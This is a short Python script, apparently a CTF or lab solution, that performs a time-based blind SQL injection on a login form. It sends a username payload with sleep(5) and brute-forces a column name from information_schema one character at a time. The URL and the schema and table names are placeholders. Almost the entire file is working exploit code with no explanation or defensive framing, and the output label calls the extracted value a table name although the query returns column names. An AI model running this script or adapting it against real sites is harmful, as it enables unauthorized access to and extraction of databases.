import requests
import string
import time
import sys

#table_name = its_in_here

def bruteforcer():
    chars = string.printable[:-6]
    print(chars)
    session = requests.session()
    url = "url goes here"
    database_name = ""
    while True:
        for i in range(1,15):
            for char in chars:
                name = f"{database_name}{char}"
                sys.stdout.write(f"\r[+]Table name: {name}")
                payload = f"admin' AND if((select substr(column_name,{i},1) from information_schema.columns where table_name='its_in_here' and table_schema='the_db_you_are_looking_for' limit 0,1) = '{char}', sleep(5), null);-- -"
                data = {"username" : payload,
                        "password" : "test"}
                time_started = time.time()
                output = session.post(url,data=data,allow_redirects = False)
                time_finished = time.time()
                time_taken = time_finished - time_started
                if time_taken < 5:
                    pass
                elif char == '%':
                    pass
                else:
                    database_name += char
                    break

if __name__ == ("__main__"):
    bruteforcer()

